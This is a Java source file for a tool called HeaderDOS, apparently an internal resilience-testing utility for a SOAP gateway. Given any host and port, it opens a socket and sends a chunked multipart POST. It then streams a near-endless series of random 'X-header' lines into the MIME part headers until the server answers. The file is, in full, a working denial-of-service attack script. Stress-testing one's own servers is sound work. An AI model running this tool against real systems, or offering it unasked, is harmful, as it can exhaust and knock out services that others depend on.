package com.l7tech.skunkworks.http;

import com.l7tech.util.HexUtils;
import org.apache.commons.httpclient.ChunkedOutputStream;

import java.io.BufferedOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Random;

/**
 * Utility for sending infinite MIME headers.
 */
public class HeaderDOS {

    public static void main( final String[] args ) throws Exception {
        if ( args.length != 2 ) {
            System.out.println( "\nUsage:\n\tHeaderDOS <host> <port>\n" );
            System.exit( 1 );
        }

        Socket socket = new Socket( args[0], Integer.parseInt(args[1]) );
        OutputStream sockOut = new BufferedOutputStream(socket.getOutputStream(), 8192);
        InputStream sockIn = socket.getInputStream();

        sockOut.write( (
            "POST /ssg/soap HTTP/1.1\r\n" +
            "User-Agent: Layer7-SecureSpan-Gateway/v5.3-b0000\r\n" +
            "SOAPAction: http://warehouse.acme.com/ws/listProducts\r\n" +
            "Content-Type: multipart/related; boundary=MIME_boundary_6f5ee426-83eb-4901-81b5-9227a5e1f972; start=\"<93cdf78b-04b8-40dd-8ae8-e92db5ff4f49@127.0.0.1>\"; start-info=\"text/xml\"; type=\"application/xop+xml\"\r\n" +
            "Host: localhost:8080\r\n" +
            "Transfer-Encoding: chunked\r\n" +
            "\r\n" ).getBytes() );

        ChunkedOutputStream cout = new ChunkedOutputStream( sockOut, 4096 );
        
        cout.write( ("--MIME_boundary_6f5ee426-83eb-4901-81b5-9227a5e1f972\r\n" +
            "Content-Type: application/xop+xml; charset=utf-8; type=\"text/xml\"\r\n" +
            "Content-Transfer-Encoding: binary\r\n" +
            "Content-Length: 391\r\n" +
            "Content-Id: <93cdf78b-04b8-40dd-8ae8-e92db5ff4f49@127.0.0.1>\r\n"
//            "\r\n" +
//            "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">\n" +
//            "    <soapenv:Header/>\n" +
//            "    <soapenv:Body>\n" +
//            "        <tns:listProducts xmlns:tns=\"http://warehouse.acme.com/ws\">\n" +
//            "            <tns:delay>int</tns:delay>\n" +
//            "        </tns:listProducts>\n" +
//            "    </soapenv:Body>\n" +
//            "</soapenv:Envelope>\r\n" +
//            "--MIME_boundary_6f5ee426-83eb-4901-81b5-9227a5e1f972--"
        ).getBytes() );

        Random random = new Random();
        byte[] data = new byte[1024];
        for ( int i=0; i<Integer.MAX_VALUE; i++ ) {
            if ( sockIn.available() > 0 ) {
                byte[] response = new byte[sockIn.available()];
                sockIn.read( response );
                System.out.write( response );
                break;
            }
            random.nextBytes( data );
            cout.write( ("X-header-"+i+": " + HexUtils.encodeBase64( data, true ) + "\r\n").getBytes() );
        }

        cout.finish();
        sockOut.flush();
        socket.close();
    }
}
